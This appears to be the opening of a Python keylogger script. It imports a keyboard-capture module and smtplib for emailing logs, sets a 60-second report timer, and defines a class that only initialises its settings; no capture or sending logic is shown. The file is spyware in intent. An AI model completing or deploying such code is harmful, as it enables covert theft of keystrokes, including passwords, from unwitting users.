import keyboard # for capturing keylogs
import smtplib # for sending email using smtp protocol
from threading import Timer # for ofcourse timer purpose
from datetime import datetime

send_report = 60 

class keylogger :
    def __init__(self, interval ,report_method = 'text_file') :

        self.interval = interval  #the time intervals
        self.report_method = report_method # the report sending medium

        self.log = "" #the actual logs to report i.e, the key reports

        
        